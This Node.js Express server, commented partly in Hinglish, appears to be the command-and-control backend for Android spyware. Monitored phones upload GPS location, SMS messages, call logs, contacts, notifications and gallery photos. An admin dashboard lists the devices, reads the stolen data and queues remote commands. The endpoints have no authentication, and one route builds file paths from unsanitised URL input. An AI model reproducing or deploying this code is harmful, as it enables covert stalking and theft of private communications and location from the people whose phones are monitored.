const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// Storage Setup: Uploads folder check
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(cors());

// Payload limit 50MB for photos/data
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));

app.use(express.static(__dirname));

// Live RAM Memory to track online/offline and commands
let devicesStatus = {}; 

// --- 1. NEW ADDITION: Dashboard ko List Dikhane ke liye Route ---
app.get('/api/admin/all-devices', (req, res) => {
    res.json(devicesStatus);
});

// --- PHONE SIDE API (Phone yahan data bhejta hai) ---

app.post('/api/status', (req, res) => {
    // Yahan maine 'level' add kiya hai taaki battery sahi pakde
    let { device_id, model, battery, level, version, charging, lat, lon } = req.body;
    
    if (!device_id) return res.status(400).json({ error: "No ID provided" });

    const id = device_id.toString().trim().toUpperCase();

    // 1. Check if any command is waiting for this phone
    const pendingCommand = (devicesStatus[id] && devicesStatus[id].command) ? devicesStatus[id].command : "none";

    // 2. Fixed Google Maps Link Generation
    let mapLink = "#";
    if (lat && lon && lat !== 0) {
        mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
    }

    // 3. Update Device Info in RAM
    // FIX: Agar battery nahi aayi toh level use karo
    let finalBattery = battery || level || 0;

    devicesStatus[id] = {
        ...devicesStatus[id], 
        id: id,
        model: model || devicesStatus[id]?.model || "Unknown Device",
        battery: finalBattery, // Ab ye 0 nahi hoga
        version: version || "--",
        charging: (charging === 'true' || charging === true),
        lat: lat || devicesStatus[id]?.lat || 0,
        lon: lon || devicesStatus[id]?.lon || 0,
        mapLink: mapLink,
        lastSeen: Date.now(),
        command: "none" // Command pick hone ke baad reset
    };

    if (pendingCommand !== "none") {
        console.log(`📡 [PING] ${id} | Command Sent to Phone: ${pendingCommand}`);
    }
    
    // Respond with command (if any)
    res.json({ status: "success", command: pendingCommand });
});

app.post('/api/upload_data', (req, res) => {
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });
    
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
        
        // --- LOCATION SPECIAL HANDLING ---
        if (type === 'location') {
            const locObj = Array.isArray(parsedData) ? parsedData[parsedData.length - 1] : parsedData;
            // Update live coordinates in RAM status
            if(devicesStatus[id]) {
                devicesStatus[id].lat = locObj.lat || locObj.latitude;
                devicesStatus[id].lon = locObj.lon || locObj.longitude || locObj.lng;
            }
            fs.writeFileSync(filePath, JSON.stringify(locObj, null, 2));
        } 
        // --- HISTORY DATA (SMS, CALLS, ETC.) ---
        else if (['notifications', 'sms', 'call_logs', 'contacts'].includes(type)) {
            let existingData = [];
            if (fs.existsSync(filePath)) {
                try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) { existingData = []; }
            }
            const newDataArray = Array.isArray(parsedData) ? parsedData : [parsedData];
            const finalData = [...newDataArray, ...existingData].slice(0, 1000);
            fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
        } 
        // --- OTHER DATA ---
        else {
            fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        }
        
        console.log(`✅ [DATA] ${type} uploaded from ${id}`);
        res.json({ status: "success" });
    } catch (error) {
        console.error(`❌ Upload Error (${type}):`, error.message);
        res.status(500).json({ status: "error" });
    }
});

app.post('/api/upload_gallery', (req, res) => {
    let { device_id, image_data, date } = req.body;
    if (!device_id || !image_data) return res.status(400).json({ error: "Missing Data" });
    
    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_gallery.json`);

    try {
        let galleryData = [];
        if (fs.existsSync(filePath)) {
            try { galleryData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) {}
        }
        
        galleryData.unshift({ 
            time: date || new Date().toLocaleString(), 
            uploadedAt: Date.now(), 
            image: image_data 
        });

        fs.writeFileSync(filePath, JSON.stringify(galleryData.slice(0, 50), null, 2));
        console.log(`📸 [GALLERY] New photo from ${id}`);
        res.json({ status: "success" });
    } catch (error) {
        res.status(500).json({ error: "Failed to save photo" });
    }
});

// --- ADMIN API (Dashboard yahan se data leta hai) ---

app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];
    if (!device) return res.json({ id: id, isOnline: false });
    
    // Agar 60 sec se update nahi aaya toh offline
    const isOnline = (Date.now() - device.lastSeen) < 60000;
    res.json({ ...device, isOnline });
});

app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    if (!device_id || !command) return res.status(400).json({ error: "Missing ID or Command" });
    
    const id = device_id.toUpperCase().trim();
    if (!devicesStatus[id]) devicesStatus[id] = { id: id };
    
    // FIX: Agar dashboard "normal" bheje toh use "loud" kar do phone ke liye
    let finalCommand = (command === "normal") ? "loud" : command;

    devicesStatus[id].command = finalCommand;
    console.log(`🚀 [CMD QUEUED] ${finalCommand} -> ${id}`);
    res.json({ status: "success" });
});

app.get('/api/get-data/:device_id/:type', (req, res) => {
    const filePath = path.join(UPLOADS_DIR, `${req.params.device_id.toUpperCase()}_${req.params.type}.json`);
    if (fs.existsSync(filePath)) res.sendFile(filePath);
    else res.json([]);
});

app.listen(PORT, () => console.log(`🔥 SERVER RUNNING ON PORT ${PORT}`));
